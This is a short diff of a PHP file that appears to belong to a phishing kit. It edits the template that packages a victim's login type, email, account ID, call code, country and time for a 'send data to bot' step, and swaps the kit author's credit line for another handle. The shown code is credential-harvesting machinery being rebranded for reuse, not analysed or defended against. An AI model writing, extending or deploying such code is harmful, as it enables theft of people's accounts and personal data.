@@ -51,7 +51,7 @@ header("Location: index.php");
 // KONTEN RESULT JANGAN DI UBAH NANTI EROR
 
 $text = urlencode("
-ʜɪ ɴᴇᴡ ᴀᴄᴄᴏᴜɴᴛ
+AKUN NGAB !!
 ━━━━━━━━━━━━
 >> Type >> $login
 >> Email >> $email
@@ -62,9 +62,10 @@ $text = urlencode("
 >> ID >> $playid
 >> Call Code >> $ccode
 >> Country >> $country
-ᯓ ᴅᴀᴛᴇ » $time
 ━━━━━━━━━━━━
- 𝙳𝙴𝚅 𝙱𝚈 @imnoob59 ˼
+~> ᴅᴀᴛᴇ » $time
+━━━━━━━━━━━━
+ιɴsтᴀԍʀᴀм: @ᴀʀᴅʏɴvʏɴ__
 ");
 
 // SEND DATA KE BOT
